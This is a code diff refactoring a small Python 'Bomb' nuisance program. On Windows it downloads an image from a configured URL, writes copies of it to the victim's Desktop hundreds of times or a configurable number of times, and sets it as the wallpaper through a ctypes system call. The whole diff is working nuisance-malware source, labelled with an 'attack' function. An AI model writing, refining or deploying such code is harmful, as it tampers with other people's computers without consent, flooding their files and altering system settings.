@@ -1,26 +1,35 @@
-import backend.config as c
-import os
-from os import path
+import backend.config as config
+import backend.paths as paths
 import requests
 import platform
 import utils.internetutil as internetutil
 
-class Bomb:
-    success = False
+success = False
+file_config = {}
+image = None
 
-    def __init__(self):
-        self.success = platform.system().lower() == "windows" and internetutil.has  
-        try:
-            self.response = requests.get(c.url, stream=True)
-        except Exception as e: pass
+def reload():
+    global file_config, success, image
+
+    file_config = config.get("file")
+    success = platform.system().lower() == "windows" and internetutil.has  
+    try:
+        image = requests.get(file_config["url"], stream=True).content
+    except Exception as e: 
+        success = False
             
-    def attack(self):
-        if not self.success:
-            return
+def attack():
+    global success
+    if not success:
+        return
+    global file_config, image
         
-        for i in range(250):
-            with open(path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(i)), 'wb') as f:
-                f.write(self.response.content)
+    def name(index):
+        return paths.desktop(file_config["output_name"]+f' ({index}).png')
+        
+    for i in range(config.get("files_range")):
+        with open(name(i), 'wb') as f:
+            f.write(image)
 
-        import ctypes
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(0)), 0)  
+    import ctypes
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, name(0), 0)  
